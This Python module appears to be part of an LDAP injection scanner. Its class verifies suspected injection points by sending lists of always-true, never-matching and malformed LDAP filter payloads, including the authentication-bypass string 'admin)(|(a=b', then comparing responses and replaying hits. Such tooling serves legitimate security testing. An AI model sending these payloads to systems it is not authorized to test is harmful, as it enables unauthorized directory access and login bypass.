import re
import sys
import time
import requests
import uuid
from typing import List, Tuple, Optional, Dict
from .models import Endpoint, Baseline, Payload, VerificationGrade, AuthState
from .client import HTTPClient
from .detection import DetectionPipeline
from .budget import AdaptiveBudgetManager
from .utils import build_injection_data, safe_val, sim_delta, verbose, ok, warn, info, is_statistically_significant

class ThreeStepVerifier:
    _TRUE_PROBES = ["*(|(objectClass=*))", "*(cn=*)", "*(|(cn=*)(uid=*))", "*", "admin)(|(a=b", "*(|(uid=admin))"]
    _FALSE_PROBES = ["*(objectClass=\\00ZZZNOMATCH)", "*(cn=\\ff\\fe\\00NOMATCH)", "*(uid=\\00\\00\\00NEVER)"]
    _PARSE_ERROR_PROBES = [")((BROKEN_LDAP_SYNTAX", "(&(INVALID(((SYNTAX", ")(BROKEN)(", "*)))))))))))))))", "(((((((((((((((", "&", "|", "!(!(!(!(!(!(!(!((", "*()", "*)((&("]
    def __init__(self, client: HTTPClient, pipeline: DetectionPipeline, budget: AdaptiveBudgetManager):
        self._client = client; self._pipeline = pipeline; self._budget = budget
    def _send(self, ep: Endpoint, param: str, value: str, phase: str = "verification") -> Optional[requests.Response]:
        data = build_injection_data(ep, param, value); sys.stderr.write(f"\r\033[2K[*] Verifying at {ep.url}:{param}..."); sys.stderr.flush()
        return self._client.send_endpoint(ep, data, phase=phase)
    def _step1_true_probe(self, ep: Endpoint, param: str, baseline: Baseline) -> Tuple[bool, str, str]:
        for p in self._TRUE_PROBES:
            if not self._budget.acquire_verification() and not self._budget.acquire_emergency(): return False, "", "Budget exhausted"
            resp = self._send(ep, param, p)
            if not resp: continue
            diff = sim_delta(baseline.body, resp.text or "")
            if diff >= baseline.diff_threshold: return True, p, f"TRUE diff={diff:.1%}"
            if re.search(r"ldap|error|syntax|filter", resp.text or "", re.I): return True, p, "TRUE: LDAP signal"
        return False, "", "Step 1 failed"
    def _step2_false_non_auth(self, ep: Endpoint, param: str, baseline: Baseline, true_body: str) -> Tuple[bool, str]:
        for p in self._FALSE_PROBES:
            if not self._budget.acquire_verification(): break
            resp = self._send(ep, param, p)
            if not resp: continue
            f_body = resp.text or ""; tf_delta = sim_delta(true_body, f_body); fbl_delta = sim_delta(f_body, baseline.body)
            if tf_delta >= baseline.bool_threshold and fbl_delta < baseline.diff_threshold: return True, f"FALSE clean (Δtf={tf_delta:.1%})"
        return False, "Step 2 failed: FALSE probe did not revert"
    def _step3_replay(self, ep: Endpoint, param: str, baseline: Baseline, payload: Payload) -> Tuple[bool, str]:
        hits = 0; trials = 3
        for _ in range(trials):
            if not self._budget.acquire_verification(): break
            resp = self._send(ep, param, payload.raw)
            if resp and self._pipeline.run(resp, baseline, payload).fired: hits += 1
            time.sleep(0.1)
        if is_statistically_significant(hits, trials, p_null=0.4): return True, f"REPLAY hits={hits}/{trials}"
        return False, f"REPLAY inconsistent ({hits}/{trials})"
    def verify(self, ep: Endpoint, param: str, baseline: Baseline, payload: Payload) -> Tuple[VerificationGrade, str]:
        s1, probe, ev = self._step1_true_probe(ep, param, baseline)
        if not s1: return VerificationGrade.REJECTED, ev
        true_body = self._send(ep, param, probe).text or ""
        s2, ev2 = self._step2_false_non_auth(ep, param, baseline, true_body)
        s3, ev3 = self._step3_replay(ep, param, baseline, payload)
        if s2 and s3: return VerificationGrade.CONFIRMED, f"{ev} | {ev2} | {ev3}"
        if s3: return VerificationGrade.PROBABLE, f"{ev} | {ev3} (S2 failed)"
        return VerificationGrade.CANDIDATE, f"{ev} (Replay failed)"
